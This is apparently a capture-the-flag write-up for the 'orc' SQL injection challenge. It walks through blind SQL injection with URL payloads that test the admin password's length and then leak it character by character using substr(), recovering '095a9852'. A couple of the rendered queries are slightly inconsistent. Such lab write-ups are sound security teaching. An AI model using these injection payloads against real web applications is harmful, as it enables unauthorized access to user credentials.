---
custom_edit_url: null
pagination_next: null
pagination_prev: null
sidebar_position: 4
---

![1](https://github.com/Kunull/Write-ups/assets/110326359/3bcdaeff-a4ba-4e3c-8acd-73e2ec8ce6d9)

We are provided with the SQL query:

```sql
SELECT id FROM prob_orc WHERE id='admin' AND pw='{$_GET[pw]}'
```

The code also performs two conditional checks:

1. `if($result['id'])`: It checks if the statement is `True`. If yes, it prints the following message: `Hello admin`
2. `if(($result['pw']) && ($result['pw'] == $_GET['pw']))`: It then checks if the `pw` that is provided is correct. If yes, it prints the flag.


In order to print out the flag, we need to first know the password. We have to perform a Blind SQL Injection.

### Blind SQL Injection

First we have to reveal the length of the flag.

If we provide the following URI:

```
?pw=' OR id='admin' AND length(pw)=1 %23
```

The resultant query becomes:

```sql
SELECT id FROM prob_orc WHERE id='admin' AND pw='' OR #length(pw)=1 #'

## Queried part:
SELECT id FROM prob_orc WHERE id='admin' AND pw='' OR length(pw)=1

## Commented part:
`
```

![2](https://github.com/Kunull/Write-ups/assets/110326359/8a33f464-e7de-4d4a-a47c-7285e7d69ea9)

Since the `Hello admin` message is not printed, we know that the resultant query did not result in `True`.
That tells us that the length of the `pw` column is more than 1.

If we keep increasing the length and provide the following URI:

```
?pw=' OR id='admin' AND length(pw)=8 %23
```

The resultant query becomes:

```sql
SELECT id FROM prob_orc WHERE id='admin' AND pw='' OR id='admin' AND length(pw)=8 #'

## Queried part:
SELECT id FROM prob_orc WHERE id='admin' AND pw='' OR id='admin' AND length(pw)=8

## Commented part:
`
```

![3](https://github.com/Kunull/Write-ups/assets/110326359/9d922a6a-4f1e-4b4a-a3bd-e8d8b721ba3e)

Since the `Hello admin` message is printed, we know that the resultant query resulted in `True`.
That tells us that the length of the `pw` column is 8.

### Leaking the password

Next, we can leak the password byte by byte using the `substr()` function.

#### `substr()`

![4](https://github.com/Kunull/Write-ups/assets/110326359/b1e4352c-c272-4fb7-8401-7d5fe2cc4423)

If we provide the following URI:

```
?pw=' OR id='admin' AND substr(pw, 1, 1)=0 %23
```

The resultant query becomes:

```sql
SELECT id FROM prob_orc WHERE id='admin' AND pw='' OR id='admin' AND substr(pw, 1, 1)=0 #'

## Queried part:
SELECT id FROM prob_orc WHERE id='admin' AND pw='' OR id='admin' AND substr(pw, 1, 1)=0 #

## Commented part:
`
```

![5](https://github.com/Kunull/Write-ups/assets/110326359/53f17b2b-b80d-4b8e-a904-bd88c1cbb7f3)

Since the `Hello admin` message is printed, we know that the resultant query resulted in `True`.
That tells us that the first character of the `pw` for `id=admin` is `0`.

We can now move onto the second character:

```
?pw=' OR id='admin' AND substr(pw, 2, 1)=0 %23
```

The resultant query becomes:

```sql
SELECT id FROM prob_orc WHERE id='admin' AND pw='' OR id='admin' AND substr(pw, 2, 1)=0 #'

## Queried part:
SELECT id FROM prob_orc WHERE id='admin' AND pw='' OR id='admin' AND substr(pw, 2, 1)=0

## Commented part:
`
```

![6](https://github.com/Kunull/Write-ups/assets/110326359/7abdfbc4-b2e1-4448-ad7e-8e38484d4cc1)

Since the `Hello admin` message is not printed, we know that the resultant query did not result in `True`.
That tells us that the second character of the `pw` for `id=admin` is not `0`.

We can try other characters moving up to the following:

```
?pw=' OR id='admin' AND substr(pw, 2, 1)=9 %23
```

![7](https://github.com/Kunull/Write-ups/assets/110326359/fcc7790e-333b-4b3c-b197-bfc02f67788d)

Since the `Hello admin` message is printed, we know that the resultant query resulted in `True`.
That tells us that the second character of the `pw` for `id=admin` is `9`.

We can keep repeating this process until we get all the eight characters of the `admin` password:

```
095a9852
```

Now, we can provide password URI:

```
?pw=095a9852' %23
```

The resultant query becomes:

```sql
SELECT id FROM prob_orc WHERE id='admin' AND pw='095a9852'
```

![8](https://github.com/Kunull/Write-ups/assets/110326359/cee48c8e-2e61-4ccd-93fc-2abe7fb6d417)
